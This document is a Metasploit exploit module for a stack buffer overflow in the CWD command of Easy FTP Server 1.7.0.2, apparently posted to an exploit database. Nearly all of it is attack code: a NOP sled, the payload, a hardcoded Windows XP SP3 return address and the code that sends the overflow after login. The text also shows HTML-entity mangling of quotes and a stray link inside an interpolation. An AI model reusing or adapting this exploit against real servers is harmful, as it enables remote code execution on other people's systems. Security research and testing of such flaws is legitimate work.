Easy FTP Server v1.7.0.2 CWD Remote BoF - MSF Module
====================================================

# Exploit Title: Easy~FTP
# Date: March 9, 2010
# Author: Blake
# Version: 1.7.0.2
# Tested on: Windows XP SP3
# CVE :
 
require &#039;msf/core&#039;
 
 
class Metasploit3 < Msf::Exploit::Remote
Rank = AverageRanking
 
include Msf::Exploit::Remote::Ftp
 
def initialize(info = {})
super(update_info(info,
&#039;Name&#039; => &#039;Easy~FTP Server v1.7.0.2 CWD Command Buffer Overflow&#039;,
&#039;Description&#039; => %q{
This module exploits a stack overflow in the CWD verb in Easy~FTP Server.
 
You must have valid credentials to trigger this vulnerability.
},
&#039;Author&#039; => &#039;Blake&#039;,
&#039;License&#039; => MSF_LICENSE,
&#039;Version&#039; => &#039;version 1&#039;,
&#039;References&#039; =>
[
[ &#039;CVE&#039;, &#039;&#039;],
[ &#039;OSVDB&#039;, &#039;&#039;],
[ &#039;EDB-ID&#039;, &#039;11539&#039;],
[ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/11539&#039; ],
],
&#039;Privileged&#039; => true,
&#039;DefaultOptions&#039; =>
{
&#039;EXITFUNC&#039; => &#039;process&#039;,
},
&#039;Payload&#039; =>
{
&#039;Space&#039; => 268,
&#039;BadChars&#039; => "\x00\x20\x0a\x0d\x2f\x5c",
&#039;StackAdjustment&#039; => -3500,
},
&#039;Platform&#039; => &#039;win&#039;,
&#039;Targets&#039; =>
[
 
[ &#039;Windows XP SP3 English&#039;, { &#039;Ret&#039; => 0x009AFD58 } ],
 
],
&#039;DisclosureDate&#039; => &#039;February 15, 2010&#039;,
&#039;DefaultTarget&#039; => 0))
end
 
 
def exploit
connect_login
 
sploit = "\x90" * (268 - payload.encoded.length)
sploit << payload.encoded
sploit << [target.ret].pack(&#039;V&#039;)
 
print_status("Trying target #{target.name<http://target.name>}...")
 
send_cmd( [&#039;CWD&#039;, sploit] , false)
 
handler
disconnect
end
 
end



